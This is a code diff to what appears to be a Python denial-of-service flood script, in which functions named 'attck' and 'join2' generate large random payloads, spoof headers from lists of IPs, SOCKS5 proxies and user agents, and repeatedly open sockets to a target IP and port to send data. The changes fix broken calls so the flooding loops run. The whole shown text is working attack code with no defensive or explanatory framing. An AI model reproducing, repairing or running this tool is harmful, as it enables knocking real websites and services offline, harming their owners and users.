@@ -879,7 +879,7 @@ def start():
 def attck():
   global userip,socks5
   hh = random._urandom(5000)
-  lb = random.choice("[!]","[#]","[*]")
+  xx = int(0)
   anjgall = "Anjing: "+random.choice(userip)+random.choice(socks5)+"\r\n"
   content = "Content-Type: application/x-www-form-urlencoded\r\n"
   length  = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
@@ -901,8 +901,7 @@ def attck():
 def join2():
   global useragent2,socks5,userip,acceptall
   data5 = random._urandom(80000)
-  data3 = random.choice(zz)
-  data2  = random.choice("[!]","[#]","[*]")
+  xx = int(0)
   useragentl = "UserAgents: "+random.choice(useragent2)+random.choice(userip)+"\r\n"
   acceptlol = random.choice(acceptall)
   sockl = random.choice(socks5)+"\r\n"
@@ -913,7 +912,7 @@ def join2():
         try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((str(ip),int(port)))
-           s.send((data5,data3,data2))
+           s.send((data5))
            s.send((main_req))
            for i in range(pack):
                s.connect((str(ip),int(port)))
